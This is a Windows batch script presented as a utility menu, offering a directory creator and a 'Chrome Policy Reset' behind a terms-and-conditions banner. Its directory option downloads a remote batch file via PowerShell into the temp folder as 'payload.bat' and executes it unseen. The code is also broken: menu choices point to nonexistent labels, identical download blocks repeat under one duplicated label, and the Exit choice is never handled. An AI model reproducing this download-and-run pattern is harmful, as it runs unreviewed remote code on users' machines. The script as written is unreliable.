@echo off
:menu
cls
echo  __   __     __     ______     __  __    
echo /\ "-.\ \   /\ \   /\  ___\   /\ \_\ \   
echo \ \ \-.  \  \ \ \  \ \___  \  \ \  __ \  
echo  \ \_\\"\_\  \ \_\  \/\_____\  \ \_\ \_\ 
echo   \/_/ \/_/   \/_/   \/_____/   \/_/\/_/ 
echo ========================================
echo TERMS AND CONDITIONS AGREEMENT:
echo ========================================
echo 1. This batch script will create directories in your file system.
echo 2. The directories created will follow a predefined structure for better organization.
echo 3. The user agrees to ensure that the directories are used responsibly.
echo 4. The user agrees that any data within these directories is their own responsibility.
echo 5. Nish or the creator of this script is not liable for any loss of data.
echo 6. This script may modify your file system's directory structure.
echo 7. The user agrees to use this script for personal, professional, or educational purposes only.
echo.
echo By proceeding, you confirm that you have read and accepted the above terms.
echo.
echo ========================================
echo PLS SELECT ONE OF THESE
echo ========================================
echo 1. Directory Creator 
echo 2. Chrome Policy Reset
echo 3. Under construction !!
echo 4. Under construction !!
echo 5. Exit
echo ========================================
set /p choice=Enter your choice (1-4): 
if "%choice%" == "1" goto directory
if "%choice%" == "2" goto rootwallil
if "%choice%" == "3" goto rootwallli
if "%choice%" == "4" goto rootwallii
echo Invalid choice, please try again.
pause
goto menu

:directory
set tempfolder=%TEMP%
set download_url=https://raw.githubusercontent.com/nishdvx/rootwall/refs/heads/main/rootwalldirectory.bat
set filepath=%tempfolder%\payload.bat
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%download_url%', '%filepath%')"
if exist "%filepath%" (
    call "%filepath%"
) else (
    echo Error: Download Failed. Please contact ravcn on Discord.
    pause
)
goto menu


:rootwall
set tempfolder=%TEMP%
set download_url=https://raw.githubusercontent.com/nishdvx/rootwall/refs/heads/main/rootwalldirectory.bat
set filepath=%tempfolder%\payload.bat
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%download_url%', '%filepath%')"
if exist "%filepath%" (
    call "%filepath%"
) else (
    echo Error: Download Failed. Please contact ravcn on Discord.
    pause
)
goto menu

:rootwall
set tempfolder=%TEMP%
set download_url=https://raw.githubusercontent.com/nishdvx/rootwall/refs/heads/main/rootwalldirectory.bat
set filepath=%tempfolder%\payload.bat
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%download_url%', '%filepath%')"
if exist "%filepath%" (
    call "%filepath%"
) else (
    echo Error: Download Failed. Please contact ravcn on Discord.
    pause
)
goto menu

:rootwall
set tempfolder=%TEMP%
set download_url=https://raw.githubusercontent.com/nishdvx/rootwall/refs/heads/main/rootwalldirectory.bat
set filepath=%tempfolder%\payload.bat
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%download_url%', '%filepath%')"
if exist "%filepath%" (
    call "%filepath%"
) else (
    echo Error: Download Failed. Please contact ravcn on Discord.
    pause
)
goto menu


:exit
echo Goodbye!
pause
exit
